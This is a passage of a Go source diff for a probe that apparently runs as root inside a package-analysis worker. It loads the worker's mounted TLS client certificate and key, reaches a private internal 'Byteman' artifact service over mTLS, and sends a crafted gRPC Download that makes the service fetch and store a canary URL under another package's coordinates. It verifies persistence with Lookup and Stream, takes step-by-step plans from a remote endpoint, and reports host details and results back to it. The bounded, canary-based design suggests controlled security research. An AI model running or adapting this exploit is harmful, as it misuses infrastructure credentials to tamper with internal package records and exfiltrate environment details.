+			digest := sha256.Sum256(field.value)
+			item.Bytes = len(field.value)
+			item.SHA256 = hex.EncodeToString(digest[:])
+			if field.number == 1 {
+				item.Text = "[pinned-readback-url]"
+			}
+		}
+		result = append(result, item)
+	}
+	return result
+}
+
+func grpcFrame(payload []byte) []byte {
+	frame := make([]byte, 5, 5+len(payload))
+	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
+	return append(frame, payload...)
+}
+
+func appendUvarint(destination []byte, value uint64) []byte {
+	var buffer [binary.MaxVarintLen64]byte
+	size := binary.PutUvarint(buffer[:], value)
+	return append(destination, buffer[:size]...)
+}
+
+func appendVarintField(destination []byte, number int, value uint64) []byte {
+	destination = appendUvarint(destination, uint64(number<<3))
+	return appendUvarint(destination, value)
+}
+
+func appendBytesField(destination []byte, number int, value []byte) []byte {
+	destination = appendUvarint(destination, uint64(number<<3|2))
+	destination = appendUvarint(destination, uint64(len(value)))
+	return append(destination, value...)
+}
+
+func appendStringField(destination []byte, number int, value string) []byte {
+	return appendBytesField(destination, number, []byte(value))
+}
+
+func mountedPrivateRootPool(rootPEM []byte) (*x509.CertPool, error) {
+	roots := x509.NewCertPool()
+	if !roots.AppendCertsFromPEM(rootPEM) {
+		return nil, errors.New("mounted Byteman root pool contained no certificates")
+	}
+	return roots, nil
+}
+
+func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
+	if len(state.PeerCertificates) == 0 {
+		return errors.New("Byteman TLS peer sent no certificate")
+	}
+	leaf := state.PeerCertificates[0]
+	if leaf.Subject.CommonName != bytemanTLSServerName {
+		return errors.New("Byteman TLS legacy common name was not localhost")
+	}
+	intermediates := x509.NewCertPool()
+	for _, certificate := range state.PeerCertificates[1:] {
+		intermediates.AddCert(certificate)
+	}
+	_, err := leaf.Verify(x509.VerifyOptions{
+		Roots: roots, Intermediates: intermediates,
+		KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+	})
+	if err != nil {
+		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
+	}
+	return nil
+}
+
+func newBytemanClient() (*http.Client, string, error) {
+	certificate, err := tls.LoadX509KeyPair(clientCertificatePath, clientKeyPath)
+	if err != nil {
+		return nil, "", err
+	}
+	rootPEM, err := os.ReadFile(serverPoolPath)
+	if err != nil {
+		return nil, "", err
+	}
+	roots, err := mountedPrivateRootPool(rootPEM)
+	if err != nil {
+		return nil, "", err
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, bytemanServiceHost)
+	if err != nil {
+		return nil, "", errors.New("direct Byteman service did not resolve")
+	}
+	var selected net.IP
+	for _, candidate := range addresses {
+		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
+			selected = candidate.IP
+			break
+		}
+	}
+	if selected == nil {
+		return nil, "", errors.New("direct Byteman service had no private address")
+	}
+	rpcDialAddress = net.JoinHostPort(selected.String(), strconv.Itoa(bytemanServicePort))
+	tlsConfig := &tls.Config{
+		Certificates:       []tls.Certificate{certificate},
+		RootCAs:            roots,
+		MinVersion:         tls.VersionTLS12,
+		ServerName:         bytemanTLSServerName,
+		InsecureSkipVerify: true, // Legacy CN-only certificate is verified below.
+		VerifyConnection: func(state tls.ConnectionState) error {
+			return verifyLegacyLocalhost(state, roots)
+		},
+	}
+	dialer := &net.Dialer{Timeout: callbackTimeout, KeepAlive: 30 * time.Second}
+	transport := &http.Transport{
+		Proxy: nil,
+		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
+			return dialer.DialContext(ctx, network, rpcDialAddress)
+		},
+		TLSClientConfig: tlsConfig, ForceAttemptHTTP2: true,
+	}
+	endpoint := "https://" + net.JoinHostPort(bytemanServiceHost, strconv.Itoa(bytemanServicePort))
+	return &http.Client{Transport: transport, Timeout: streamHTTPTimeout}, endpoint, nil
 }
 
 func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
 	encoded, err := json.MarshalIndent(report, "", "  ")
 	result := commandResult{
-		Version:    protocolVersion,
-		Session:    sessionNonce,
-		ID:         id,
-		CWD:        cwd,
+		Version: protocolVersion, Session: callbackSessionNonce, ID: id, CWD: cwd,
 		DurationMS: time.Since(started).Milliseconds(),
 	}
 	if err != nil {
@@ -370,6 +746,36 @@ func submitProbeReport(endpoint, id, cwd string, started time.Time, report probe
 		result.Stdout = string(encoded)
 	}
 	return submitResult(endpoint, result)
+}
+
+func submitResult(endpoint string, result commandResult) error {
+	body, err := json.Marshal(result)
+	if err != nil || len(body) > maximumResultBytes {
+		return errors.New("result envelope was invalid")
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(body))
+	if err != nil {
+		return err
+	}
+	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("User-Agent", probeUserAgent)
+	request.Header.Set("X-Codex-Probe-Session", callbackSessionNonce)
+	client := &http.Client{
+		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
+		Timeout:       callbackTimeout,
+	}
+	response, err := client.Do(request)
+	if err != nil {
+		return err
+	}
+	defer response.Body.Close()
+	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
+	if response.StatusCode != http.StatusCreated {
+		return fmt.Errorf("result endpoint HTTP %d", response.StatusCode)
+	}
+	return nil
 }
 
 func initialWorkingDirectory() string {
@@ -389,21 +795,16 @@ func initialWorkingDirectory() string {
 func inspectIdentity(cwd string) identityResult {
 	lane := "other"
 	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
-	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
-		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
-			lane = "capslock"
-		}
+	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) &&
+		strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
+		lane = "capslock"
 	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
 		lane = "generic"
 	}
 	hostname, _ := os.Hostname()
 	result := identityResult{
-		Lane:     lane,
-		CWD:      cwd,
-		UID:      os.Geteuid(),
-		GID:      os.Getegid(),
-		Hostname: hostname,
-		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
+		Lane: lane, CWD: cwd, UID: os.Geteuid(), GID: os.Getegid(), Hostname: hostname,
+		PID1: strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
 	}
 	if len(result.PID1) > 1024 {
 		result.PID1 = result.PID1[:1024] + "[truncated]"
@@ -414,30 +815,14 @@ func inspectIdentity(cwd string) identityResult {
 			break
 		}
 		info, err := entry.Info()
-		if err != nil {
-			continue
-		}
-		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
-			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
-		})
-	}
-	for _, value := range os.Environ() {
-		name, _, found := strings.Cut(value, "=")
-		if found && name != "" {
-			result.EnvironmentNames = append(result.EnvironmentNames, name)
+		if err == nil {
+			result.ModuleFiles = append(result.ModuleFiles, fileEntry{Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size()})
 		}
 	}
-	sort.Strings(result.EnvironmentNames)
-	for _, path := range []string{
-		"/etc/tls/server-pool/server-tls-pool.pem",
-		"/etc/tls/client/tls.crt",
-		"/etc/tls/client/tls.key",
-	} {
+	for _, path := range []string{serverPoolPath, clientCertificatePath, clientKeyPath} {
 		item := tlsFile{Path: path}
 		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
-			item.Present = true
-			item.Mode = info.Mode().String()
-			item.Size = info.Size()
+			item.Present, item.Mode, item.Size = true, info.Mode().String(), info.Size()
 		}
 		result.TLSFiles = append(result.TLSFiles, item)
 	}
@@ -462,1500 +847,13 @@ func cleanError(err error) string {
 		return ""
 	}
 	value := err.Error()
-	value = strings.ReplaceAll(value, sessionNonce, "[session]")
-	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
-	if rpcDialAddress != "" {
-		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
-	}
-	if rpcServiceHost != "" {
-		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
+	for _, secret := range []string{callbackSessionNonce, pinnedReadbackSession, pinnedReadbackURL, rpcDialAddress} {
+		if secret != "" {
+			value = strings.ReplaceAll(value, secret, "[redacted]")
+		}
 	}
 	if len(value) > 1024 {
 		value = value[:1024] + "[truncated]"
 	}
 	return value
-}
-
-func runCapslockSession(started time.Time, cwd string, identity identityResult) {
-	initial := newProbeReport(started, identity)
-	fillCapslockContext(&initial)
-	initial.Reason = "waiting for a bounded Byteman plan"
-	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v046-codex-capslock-initial", cwd, started, initial); err != nil {
-		return
-	}
-
-	deadline := time.Now().Add(planPollWindow)
-	cursor := 0
-	consecutiveErrors := 0
-	budget := &mutationBudget{}
-	for cursor < maximumPlanStep && time.Now().Before(deadline) {
-		step, available, err := fetchPlan(cursor)
-		if err != nil {
-			consecutiveErrors++
-			if consecutiveErrors >= 3 {
-				break
-			}
-			time.Sleep(2 * time.Second)
-			continue
-		}
-		consecutiveErrors = 0
-		if !available {
-			time.Sleep(2 * time.Second)
-			continue
-		}
-		stepStarted := time.Now()
-		report := newProbeReport(stepStarted, identity)
-		report.PlanID = step.ID
-		report.RouteMode = step.RouteMode
-		switch step.Action {
-		case "finish":
-			report.Reason = "bounded plan finished"
-		case "inspect-session-dataflow":
-			runSessionDataflowInspection(&report)
-		case "probe-byteman":
-			runBytemanProbe(&report, step.RouteMode, budget)
-		default:
-			report.Reason = "validated plan action had no implementation"
-		}
-		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v046-codex-step-" + strconv.Itoa(cursor)
-		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
-			return
-		}
-		cursor++
-		if step.Action == "finish" {
-			return
-		}
-	}
-	finalStarted := time.Now()
-	final := newProbeReport(finalStarted, identity)
-	if cursor >= maximumPlanStep {
-		final.Reason = "bounded plan step limit reached"
-	} else if consecutiveErrors >= 3 {
-		final.Reason = "bounded plan endpoint failed three times"
-	} else {
-		final.Reason = "bounded plan polling window expired"
-	}
-	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v046-codex-final", cwd, finalStarted, final)
-}
-
-func fetchPlan(cursor int) (planStep, bool, error) {
-	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
-	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
-	if err != nil {
-		return planStep{}, false, err
-	}
-	request.Header.Set("User-Agent", probeUserAgent)
-	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
-	client := &http.Client{
-		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
-		Timeout:       requestTimeout,
-	}
-	response, err := client.Do(request)
-	if err != nil {
-		return planStep{}, false, err
-	}
-	defer response.Body.Close()
-	if response.StatusCode == http.StatusNoContent {
-		return planStep{}, false, nil
-	}
-	if response.StatusCode != http.StatusOK {
-		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
-	}
-	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
-	if err != nil || len(body) > maximumPlanBody {
-		return planStep{}, false, errors.New("plan response too large")
-	}
-	decoder := json.NewDecoder(bytes.NewReader(body))
-	decoder.DisallowUnknownFields()
-	var step planStep
-	if err := decoder.Decode(&step); err != nil {
-		return planStep{}, false, errors.New("plan response was invalid JSON")
-	}
-	if err := decoder.Decode(&struct{}{}); err != io.EOF {
-		return planStep{}, false, errors.New("plan response had trailing data")
-	}
-	if err := validatePlanStep(step); err != nil {
-		return planStep{}, false, err
-	}
-	return step, true, nil
-}
-
-func validatePlanStep(step planStep) error {
-	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
-		return errors.New("plan identity was invalid")
-	}
-	for _, value := range step.ID {
-		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
-			return errors.New("plan identity was invalid")
-		}
-	}
-	switch step.Action {
-	case "probe-byteman":
-		if !allowedRouteMode(step.RouteMode) {
-			return errors.New("plan route mode was not allowed")
-		}
-	case "inspect-session-dataflow", "finish":
-		if step.RouteMode != "" {
-			return errors.New("non-probe plan included route parameters")
-		}
-	default:
-		return errors.New("plan action was not allowed")
-	}
-	return nil
-}
-
-func allowedRouteMode(value string) bool {
-	switch value {
-	case "byteman-core-localhost", "byteman-localhost", "rpc-gateway",
-		"byteman-oregon-gateway", "byteman-home-oregon-gateway", "byteman-iowa-gateway":
-		return true
-	default:
-		return false
-	}
-}
-
-func fillCapslockContext(report *probeReport) {
-	metadataClient := &http.Client{
-		Transport: &http.Transport{Proxy: nil},
-		Timeout:   requestTimeout,
-	}
-	metadata, _ := inspectMetadata(metadataClient)
-	report.Metadata = metadata
-}
-
-func runBytemanProbe(report *probeReport, routeMode string, budget *mutationBudget) {
-	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
-	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
-	report.CanaryBodySHA256 = targetCanarySHA256
-	if err := validateRuntimeConfiguration(); err != nil {
-		report.Reason = "runtime-owned target validation failed"
-		return
-	}
-	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
-	if err != nil {
-		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
-		return
-	}
-	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
-	coordinateLookupRequest := buildCoordinateLookupRequest()
-	baselineURL := callLookup(rpcClient, rpcEndpoint, "baseline-url-lookup", urlLookupRequest)
-	report.Byteman = append(report.Byteman, baselineURL)
-	baselineCoordinate := callLookup(rpcClient, rpcEndpoint, "baseline-coordinate-lookup", coordinateLookupRequest)
-	report.Byteman = append(report.Byteman, baselineCoordinate)
-	if exactLookupResult(baselineURL, "", "") {
-		rpcClient.CloseIdleConnections()
-		runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, true, false,
-			baselineURL.DigestFieldSHA256, baselineURL.IDFieldSHA256)
-		return
-	}
-	rpcClient.CloseIdleConnections()
-	downloadRequest, err := buildTargetDownloadRequest(bytemanCanaryURL)
-	if err != nil {
-		report.Reason = cleanError(err)
-		return
-	}
-	downloadClient, downloadEndpoint, err := newMTLSClient(routeMode)
-	if err != nil {
-		report.Byteman = append(report.Byteman, grpcResult{
-			ID: "download-client-setup", Method: "client-setup", Error: cleanError(err),
-		})
-		report.Reason = "fresh single-Download mTLS client setup failed"
-		return
-	}
-	if !budget.claim() {
-		downloadClient.CloseIdleConnections()
-		report.MutationBudgetClaimed = true
-		report.Reason = "session-wide one-mutation budget was already claimed; no Download was sent"
-		return
-	}
-	report.MutationBudgetClaimed = true
-	report.DownloadAttempted = true
-	download := callDownload(downloadClient, downloadEndpoint, downloadRequest)
-	report.Byteman = append(report.Byteman, download)
-	downloadClient.CloseIdleConnections()
-	if !grpcSucceeded(download) || download.AnalysisError != "" || !download.RecordMatched ||
-		download.DigestFieldSHA256 == "" || download.IDFieldSHA256 == "" {
-		report.AmbiguousReadback = true
-		runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, false, true, "", "")
-		return
-	}
-	runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, false, false, download.DigestFieldSHA256, download.IDFieldSHA256)
-}
-
-func runOfflineReadback(report *probeReport, routeMode string, urlLookupRequest, coordinateLookupRequest []byte, readbackOnly, ambiguous bool, expectedDigestSHA256, expectedIDSHA256 string) {
-	// HEAD cannot claim the one-shot URL. Only after HEAD proves that Byteman
-	// consumed it do we GET the fixed 410 receipt and begin read-only recovery.
-	report.Origin = waitOriginOffline()
-	if !report.Origin.Offline {
-		if readbackOnly {
-			report.Reason = "baseline URL record existed but its one-shot origin was not offline; readback stopped"
-		} else if ambiguous {
-			report.Reason = "Download response was ambiguous, but non-consuming origin checks found no Byteman fetch; read-only recovery stopped"
-		} else {
-			report.Reason = "one-shot canary origin was not offline; persistence reads were not attempted"
-		}
-		return
-	}
-
-	deadline := time.Now().Add(postWritePollWindow)
-	matched := false
-	for attempt := 0; attempt < maximumPostWritePollAttempts && time.Now().Before(deadline); attempt++ {
-		freshClient, freshEndpoint, err := newMTLSClient(routeMode)
-		if err != nil {
-			report.Byteman = append(report.Byteman, grpcResult{
-				ID: "fresh-client-setup-" + strconv.Itoa(attempt), Method: "client-setup", Error: cleanError(err),
-			})
-			break
-		}
-		report.FreshMTLSClient = true
-		remaining := time.Until(deadline)
-		perCall := postWriteCallLimit
-		if remaining < perCall {
-			perCall = remaining
-		}
-		if perCall < 500*time.Millisecond {
-			freshClient.CloseIdleConnections()
-			break
-		}
-		postURL := callLookupTimeout(freshClient, freshEndpoint, "post-url-lookup-"+strconv.Itoa(attempt), urlLookupRequest, perCall)
-		if !exactLookupResult(postURL, expectedDigestSHA256, expectedIDSHA256) {
-			freshClient.CloseIdleConnections()
-			postURL.Wire = nil
-			report.Byteman = append(report.Byteman, postURL)
-		} else {
-			remaining = time.Until(deadline)
-			coordinateLimit := postWriteCallLimit
-			if remaining < coordinateLimit {
-				coordinateLimit = remaining
-			}
-			if coordinateLimit < 500*time.Millisecond {
-				freshClient.CloseIdleConnections()
-				report.Byteman = append(report.Byteman, postURL)
-				break
-			}
-			postCoordinate := callLookupTimeout(freshClient, freshEndpoint, "post-coordinate-lookup-"+strconv.Itoa(attempt), coordinateLookupRequest, coordinateLimit)
-			freshClient.CloseIdleConnections()
-			exact := exactLookupPair(postURL, postCoordinate, expectedDigestSHA256, expectedIDSHA256)
-			if !exact {
-				postURL.Wire = nil
-				postCoordinate.Wire = nil
-			}
-			report.Byteman = append(report.Byteman, postURL, postCoordinate)
-			if exact {
-				matched = true
-				break
-			}
-		}
-		remaining = time.Until(deadline)
-		if remaining <= 0 {
-			break
-		}
-		delay := postWritePollDelay
-		if remaining < delay {
-			delay = remaining
-		}
-		time.Sleep(delay)
-	}
-	if !matched {
-		if ambiguous {
-			report.Reason = "origin consumption proved a possible ambiguous Download, but bounded URL-first recovery found no identical exact B record pair"
-		} else {
-			report.Reason = "bounded fresh-client URL-first post-write poll found no identical exact B record pair"
-		}
-		return
-	}
-
-	streamClient, streamEndpoint, err := newMTLSClient(routeMode)
-	if err != nil {
-		report.Byteman = append(report.Byteman, grpcResult{
-			ID: "stream-client-setup", Method: "client-setup", Error: cleanError(err),
-		})
-		report.Reason = "fresh Stream mTLS client setup failed"
-		return
-	}
-	report.FreshMTLSClient = true
-	stream := callStream(streamClient, streamEndpoint)
-	streamClient.CloseIdleConnections()
-	report.Byteman = append(report.Byteman, stream)
-	if grpcSucceeded(stream) && stream.PayloadBytes == targetCanaryBytes &&
-		stream.PayloadSHA256 == targetCanarySHA256 {
-		report.StreamVerified = true
-		if readbackOnly {
-			report.Reason = "pre-existing URL record was verified read-only with offline fresh-client Lookup and Stream"
-		} else if ambiguous {
-			report.Reason = "read-only recovery proved the ambiguous Download persisted the exact offline cross-package canary"
-		} else {
-			report.Reason = "offline fresh-client Lookup and Stream verified the exact cross-package canary"
-		}
-		return
-	}
-	report.Reason = "Stream did not reproduce the exact offline cross-package canary"
-}
-
-func exactLookupResult(result grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
-	if !grpcSucceeded(result) || result.AnalysisError != "" || result.LookupMatchCount != 1 ||
-		result.LookupMatchSHA256 == "" || result.DigestFieldSHA256 == "" || result.IDFieldSHA256 == "" {
-		return false
-	}
-	return (expectedDigestSHA256 == "" || result.DigestFieldSHA256 == expectedDigestSHA256) &&
-		(expectedIDSHA256 == "" || result.IDFieldSHA256 == expectedIDSHA256)
-}
-
-func exactLookupPair(urlResult, coordinateResult grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
-	return exactLookupResult(urlResult, expectedDigestSHA256, expectedIDSHA256) &&
-		exactLookupResult(coordinateResult, expectedDigestSHA256, expectedIDSHA256) &&
-		urlResult.LookupMatchSHA256 != "" && urlResult.LookupMatchSHA256 == coordinateResult.LookupMatchSHA256 &&
-		urlResult.DigestFieldSHA256 == coordinateResult.DigestFieldSHA256 &&
-		urlResult.IDFieldSHA256 == coordinateResult.IDFieldSHA256
-}
-
-func callLookup(client *http.Client, endpoint, id string, request []byte) grpcResult {
-	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Lookup", request)
-	return finishLookup(result, body, id)
-}
-
-func callLookupTimeout(client *http.Client, endpoint, id string, request []byte, timeout time.Duration) grpcResult {
-	result, body := callGRPCRawTimeout(client, endpoint, "/sos.byteman.Byteman/Lookup", request, timeout)
-	return finishLookup(result, body, id)
-}
-
-func finishLookup(result grpcResult, body []byte, id string) grpcResult {
-	result.ID = id
-	if !grpcSucceeded(result) {
-		return result
-	}
-	analysis, err := analyzeLookupBody(body)
-	result.Wire = analysis.Wire
-	result.LookupMatchPath = analysis.MatchPath
-	result.LookupRecordCount = analysis.RecordCount
-	result.LookupMatchCount = analysis.MatchCount
-	result.LookupRecordsSHA256 = analysis.RecordsSHA256
-	result.LookupMatchSHA256 = analysis.MatchSHA256
-	result.RecordSHA256 = analysis.RecordSHA256
-	result.DigestFieldSHA256 = analysis.DigestSHA256
-	result.IDFieldSHA256 = analysis.IDSHA256
-	if err != nil {
-		result.AnalysisError = cleanError(err)
-		return result
-	}
-	result.LookupRecordMatched = analysis.MatchCount == 1
-	result.RecordMatched = analysis.MatchCount == 1
-	return result
-}
-
-func callDownload(client *http.Client, endpoint string, request []byte) grpcResult {
-	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Download", request)
-	result.ID = "cross-package-download"
-	if !grpcSucceeded(result) {
-		return result
-	}
-	analysis, err := analyzeDownloadBody(body)
-	result.Wire = analysis.Wire
-	result.RecordMatched = analysis.Identity.Matched
-	result.RecordSHA256 = analysis.Identity.RecordSHA256
-	result.DigestFieldSHA256 = analysis.Identity.DigestSHA256
-	result.IDFieldSHA256 = analysis.Identity.IDSHA256
-	result.DownloadStatusSet = analysis.StatusSet
-	result.DownloadStatusCode = analysis.StatusCode
-	if err != nil {
-		result.AnalysisError = cleanError(err)
-	}
-	return result
-}
-
-func callStream(client *http.Client, endpoint string) grpcResult {
-	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Stream", buildTargetStreamRequest(bytemanCanaryURL))
-	result.ID = "offline-stream-readback"
-	if !grpcSucceeded(result) {
-		return result
-	}
-	wire, payload, path, err := analyzeStreamBody(body)
-	result.Wire = wire
-	if err != nil {
-		result.AnalysisError = cleanError(err)
-		return result
-	}
-	digest := sha256.Sum256(payload)
-	result.PayloadBytes = len(payload)
-	result.PayloadSHA256 = hex.EncodeToString(digest[:])
-	result.PayloadPath = path
-	return result
-}
-
-func waitOriginOffline() originResult {
-	deadline := time.Now().Add(originTransitionWindow)
-	last := originResult{}
-	for time.Now().Before(deadline) {
-		last = verifyOriginOffline()
-		if last.Offline {
-			return last
-		}
-		remaining := time.Until(deadline)
-		if remaining <= 0 {
-			break
-		}
-		delay := time.Second
-		if remaining < delay {
-			delay = remaining
-		}
-		time.Sleep(delay)
-	}
-	return last
-}
-
-func verifyOriginOffline() originResult {
-	result := originResult{}
-	client := &http.Client{
-		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
-		Timeout:       requestTimeout,
-	}
-	headContext, headCancel := context.WithTimeout(context.Background(), requestTimeout)
-	defer headCancel()
-	head, err := http.NewRequestWithContext(headContext, http.MethodHead, bytemanCanaryURL, nil)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	head.Header.Set("User-Agent", probeUserAgent+"-offline-check")
-	headResponse, err := client.Do(head)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	result.HeadHTTPStatus = headResponse.StatusCode
-	result.HeadState = headResponse.Header.Get("X-Codex-One-Shot-State")
-	headResponse.Body.Close()
-	if result.HeadHTTPStatus != http.StatusGone || result.HeadState != "consumed" {
-		return result
-	}
-
-	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
-	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodGet, bytemanCanaryURL, nil)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	request.Header.Set("User-Agent", probeUserAgent+"-offline-check")
-	response, err := client.Do(request)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	defer response.Body.Close()
-	result.HTTPStatus = response.StatusCode
-	result.ContentType = response.Header.Get("Content-Type")
-	result.State = response.Header.Get("X-Codex-One-Shot-State")
-	body, err := io.ReadAll(io.LimitReader(response.Body, 4097))
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	if len(body) > 4096 {
-		result.Error = "origin check response too large"
-		return result
-	}
-	result.BodyBytes = len(body)
-	digest := sha256.Sum256(body)
-	result.BodySHA256 = hex.EncodeToString(digest[:])
-	result.Offline = response.StatusCode == http.StatusGone &&
-		result.BodyBytes == originGoneBytes && result.BodySHA256 == originGoneSHA256 &&
-		result.ContentType == "application/json" && result.State == "consumed"
-	return result
-}
-
-func grpcSucceeded(result grpcResult) bool {
-	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0"
-}
-
-func buildURLLookupRequest(canaryURL string) []byte {
-	return appendStringField(nil, 2, canaryURL)
-}
-
-func buildCoordinateLookupRequest() []byte {
-	request := []byte{}
-	request = appendStringField(request, 7, targetRegistry)
-	request = appendStringField(request, 8, targetModuleName)
-	request = appendStringField(request, 9, targetVersion)
-	request = appendVarintField(request, 10, lookupRecordLimit)
-	return request
-}
-
-func buildTargetMetadata() []byte {
-	metadata := []byte{}
-	metadata = appendStringField(metadata, 2, targetRegistry)
-	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
-	metadata = appendStringField(metadata, 4, targetModuleName)
-	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
-	metadata = appendStringField(metadata, 6, targetVersion)
-	return metadata
-}
-
-func descriptorVerifiedDownloadPolicy() (int, uint64, error) {
-	field, fieldErr := strconv.Atoi(descriptorDownloadPolicyField)
-	value, valueErr := strconv.ParseUint(descriptorDownloadPolicyValue, 10, 64)
-	validName := len(descriptorDownloadPolicyName) >= 1 && len(descriptorDownloadPolicyName) <= 64
-	for _, character := range descriptorDownloadPolicyName {
-		if (character < 'A' || character > 'Z') && (character < '0' || character > '9') && character != '_' {
-			validName = false
-		}
-	}
-	if fieldErr != nil || valueErr != nil || field != 5 || value != 4 ||
-		!validName || descriptorDownloadPolicyName != "ALWAYS" {
-		return 0, 0, errors.New("descriptor-verified Download policy patch point was unresolved")
-	}
-	return field, value, nil
-}
-
-func descriptorVerifiedRedirectConfig() (int, []byte, error) {
-	configField, configErr := strconv.Atoi(descriptorRedirectConfigField)
-	policyField, fieldErr := strconv.Atoi(descriptorRedirectPolicyField)
-	policyValue, valueErr := strconv.ParseUint(descriptorRedirectPolicyValue, 10, 64)
-	if configErr != nil || fieldErr != nil || valueErr != nil || configField != 8 || policyField != 1 ||
-		policyValue != 2 || descriptorRedirectPolicyName != "FOLLOW_NONE" {
-		return 0, nil, errors.New("descriptor-verified RedirectConfig patch point was unresolved")
-	}
-	return configField, appendVarintField(nil, policyField, policyValue), nil
-}
-
-func buildTargetDownloadRequest(canaryURL string) ([]byte, error) {
-	if canaryURL != bytemanCanaryURL {
-		return nil, errors.New("Download URL did not equal the runtime-validated owned-B URL")
-	}
-	policyField, policyValue, err := descriptorVerifiedDownloadPolicy()
-	if err != nil {
-		return nil, err
-	}
-	redirectField, redirectConfig, err := descriptorVerifiedRedirectConfig()
-	if err != nil {
-		return nil, err
-	}
-	request := []byte{}
-	request = appendStringField(request, 1, canaryURL)
-	request = appendBytesField(request, 4, buildTargetMetadata())
-	request = appendStringField(request, 6, downloadSource)
-	request = appendVarintField(request, policyField, policyValue)
-	request = appendBytesField(request, redirectField, redirectConfig)
-	return request, nil
-}
-
-func buildTargetStreamRequest(canaryURL string) []byte {
-	request := appendStringField(nil, 1, canaryURL)
-	request = appendBytesField(request, 2, buildTargetMetadata())
-	return request
-}
-
-type decodedWireMessage struct {
-	fields []decodedWireField
-}
-
-type decodedWireField struct {
-	number int
-	wire   int
-	varint uint64
-	value  []byte
-	child  *decodedWireMessage
-}
-
-func decodeWireMessage(data []byte, depth int) (*decodedWireMessage, bool) {
-	if depth > maximumWireDepth {
-		return nil, false
-	}
-	message := &decodedWireMessage{}
-	for offset := 0; offset < len(data); {
-		key, size := binary.Uvarint(data[offset:])
-		if size <= 0 {
-			return nil, false
-		}
-		offset += size
-		number := int(key >> 3)
-		wire := int(key & 7)
-		if number < 1 || number > (1<<29)-1 {
-			return nil, false
-		}
-		field := decodedWireField{number: number, wire: wire}
-		switch wire {
-		case 0:
-			field.varint, size = binary.Uvarint(data[offset:])
-			if size <= 0 {
-				return nil, false
-			}
-			offset += size
-		case 1:
-			if len(data)-offset < 8 {
-				return nil, false
-			}
-			offset += 8
-		case 2:
-			length, lengthSize := binary.Uvarint(data[offset:])
-			if lengthSize <= 0 {
-				return nil, false
-			}
-			offset += lengthSize
-			if length > uint64(len(data)-offset) {
-				return nil, false
-			}
